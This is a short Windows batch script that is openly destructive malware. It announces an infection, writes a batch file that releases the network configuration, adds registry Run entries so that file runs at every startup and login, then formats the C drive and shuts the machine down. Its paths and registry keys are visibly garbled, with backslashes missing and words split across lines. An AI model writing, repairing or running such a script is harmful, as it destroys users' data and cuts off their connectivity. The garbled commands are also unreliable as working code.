@echo on
echo "You have been infected with malware. The following will happen after 30 seconds: Your internet connection will be permanently killed, your C drive will be formatted and your computer will be shutdown"
SLEEP 30
@echo off
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat reg
add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d :windowswimn32.bat /f reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo Disable ! PAUSE
format C:\
shutdown
